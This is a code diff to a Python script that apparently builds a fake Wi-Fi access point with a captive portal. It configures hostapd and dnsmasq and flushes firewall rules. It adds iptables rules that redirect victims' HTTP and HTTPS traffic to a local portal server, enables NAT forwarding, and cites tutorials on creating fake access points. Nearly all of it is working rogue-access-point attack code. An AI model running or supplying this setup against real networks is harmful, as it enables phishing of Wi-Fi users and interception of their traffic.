@@ -2,10 +2,12 @@ import os
 import sys
 
 
-def openAP(net_ssid,net_channel,interface,attack_interface):
+def openAP(net_ssid,net_channel,internet_interface,interface):
 
     # Source: https://hakin9.org/create-a-fake-access-point-by-anastasis-vasileiadis/
     # Source: https://zsecurity.org/how-to-start-a-fake-access-point-fake-wifi/
+    # Source: https://andrewwippler.com/2016/03/11/wifi-captive-portal/
+    # Source: https://unix.stackexchange.com/questions/132130/iptables-based-redirect-captive-portal-style
 
     # enable monitor mode
     os.system(f'sudo ifconfig {interface} down')
@@ -17,7 +19,6 @@ def openAP(net_ssid,net_channel,interface,attack_interface):
     os.system('service dnsmasq stop')
     os.system('killall dnsmasq >/dev/null 2>&1')
     os.system('killall hostapd >/dev/null 2>&1')
-    # os.system('service NetworkManager stop')
 
     # Clear port 53
     os.system('systemctl disable systemd-resolved.service >/dev/null 2>&1')
@@ -32,23 +33,19 @@ def openAP(net_ssid,net_channel,interface,attack_interface):
     n = conf_file.write(conf_text)
     conf_file.close()
 
-    conf_text = f"interface={interface}\ndhcp-range=10.0.0.3,10.0.0.30,255.255.255.0,12h"\
-    "\ndhcp-option=3,10.0.0.1\ndhcp-option=6,10.0.0.1\nlisten-address=127.0.0.1"\
-    "\nserver=8.8.8.8\naddress=/#/10.0.0.1"
+    conf_text = f"interface={interface}\ndhcp-range=192.168.24.25,192.168.24.50,255.255.255.0,12h"\
+    "\ndhcp-option=3,192.168.24.1\ndhcp-option=6,192.168.24.1"\
+    f"\nlog-queries\nlog-dhcp\n"\
+        # \nlisten-address=127.0.0.1
+        # address=/#/192.168.24.1\n
+    # ""
     conf_file = open("dnsmasq.conf", "w")
     n = conf_file.write(conf_text)
     conf_file.close()
 
 
-    # AP with address 10.0.0.1 on the given interface
-    os.system(f"ifconfig {interface} up 10.0.0.1 netmask 255.255.255.0")
-
-    # Add defualt gateway
-    os.system("route add default gw 10.0.0.1")
-
-    # Enable IP forwarding
-    os.system('echo 1 > /proc/sys/net/ipv4/ip_forward')
-
+    # AP with address 192.168.24.1 on the given interface
+    os.system(f"ifconfig {interface} up 192.168.24.1 netmask 255.255.255.0")
 
     # Clear all IP Rules
     os.system('iptables --flush')
@@ -59,9 +56,18 @@ def openAP(net_ssid,net_channel,interface,attack_interface):
     # Allowing packets forwarding through the network.
     os.system('iptables -P FORWARD ACCEPT')
 
-    # os.system(f"iptables -t nat -A POSTROUTING -s 10.10.0.0/16 -o pp0 -j MASQUERADE")
+    # Redirect any request to the captive portal
+    os.system(f'iptables -t nat -A PREROUTING  -i {internet_interface} -p tcp --dport 80 -j DNAT  --to-destination 192.168.24.1')
+    os.system(f'iptables -t nat -A PREROUTING  -i {internet_interface} -p tcp --dport 443 -j DNAT  --to-destination 192.168.24.1')
 
-    # Change defualt port for capital portal to port 60
+    # Enable internet access use the second interface
+    os.system(f'iptables -t nat -A POSTROUTING --out-interface {internet_interface} -j MASQUERADE')
+    os.system(f'iptables -A FORWARD --in-interface {interface} -j ACCEPT')
+    
+    # Enable IP forwarding from one interface to another
+    os.system('echo 1 > /proc/sys/net/ipv4/ip_forward')
+
+    # Change defualt port for capital portal to port 70;
     os.system('iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-ports 70')
 
 
@@ -71,28 +77,16 @@ def openAP(net_ssid,net_channel,interface,attack_interface):
     # Running the web server 
     os.system('service apache2 start')
     os.system('gnome-terminal -- sh -c "sudo node web/html/index.js;"$SHELL')
-    os.system('route add default gw 10.0.0.1')
 
     # Link hostpad to the configuration file.
-    # os.system('service NetworkManager stop')
-
     os.system("hostapd hostapd.conf")
-    os.system('route add default gw 10.0.0.1')
 
-    # print("ssssssssssssssssssssssssssssssssssssss")
-    # os.system(f'sudo ifconfig {attack_interface} down')
-    # os.system(f'sudo iwconfig {attack_interface} mode managed')
-    # os.system(f'sudo ifconfig {attack_interface} up')
-
-    # os.system(f'iptables --table nat --append POSTROUTING --out-interface {attack_interface} -j MASQUERADE')
-    # os.system(f'iptables --append FORWARD --in-interface {interface} -j ACCEPT')
 
     # Reset all setting to defualt
     os.system("systemctl enable systemd-resolved.service >/dev/null 2>&1") 
     os.system("systemctl start systemd-resolved >/dev/null 2>&1") 
     os.system("sudo rm /etc/resolv.conf")
     os.system("sudo ln -s /run/systemd/resolve/resolv.conf /etc/resolv.conf")
-    # os.system('service NetworkManager start')
 
 
 
